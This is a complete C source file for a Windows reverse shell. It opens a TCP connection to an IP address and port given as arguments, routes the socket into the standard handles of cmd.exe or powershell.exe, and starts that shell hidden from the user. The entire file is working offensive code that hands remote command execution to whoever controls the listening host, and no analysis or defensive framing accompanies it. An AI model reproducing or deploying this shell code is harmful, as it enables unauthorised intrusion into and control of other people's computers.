#include <WinSock2.h>
#include <Windows.h>
#include <tchar.h>
#include <WS2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main(int argc, char * argv[]) {
	WSADATA wsa;
	struct sockaddr_in Server = { 0 };
	STARTUPINFO startupinfo = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	unsigned long ServerIP;
	int result;

	if (argc != 4) {
		printf("[!] Usage: %s [powershell.exe | cmd.exe] [Server IP] [Server Port]", argv[0]);
		return -1;
	}
	 
	result = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (result != 0) {
		return -1;
	}

	const SOCKET SSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	if (SSocket == INVALID_SOCKET) {
		WSACleanup();
		return -1;
	}

	Server.sin_family = AF_INET;
	Server.sin_port = htons(atoi(argv[3]));
	InetPtonA(AF_INET, (argv[2]), &ServerIP);
	Server.sin_addr.S_un.S_addr = ServerIP;

	result = connect(SSocket, (SOCKADDR*)&Server, sizeof(Server));
	if (result == SOCKET_ERROR) {
		closesocket(SSocket);
		WSACleanup();
		return -1;
	}

	ZeroMemory(&startupinfo, sizeof(STARTUPINFO));
	startupinfo.cb = sizeof(startupinfo);
	startupinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	startupinfo.hStdInput = (HANDLE)SSocket;
	startupinfo.hStdOutput = (HANDLE)SSocket;
	startupinfo.hStdError = (HANDLE)SSocket;

	if (!CreateProcessA(NULL, argv[1], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &pi)){
		closesocket(SSocket);
		WSACleanup();
		return -1;
	}

	closesocket(SSocket);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);       

	return 0;
}
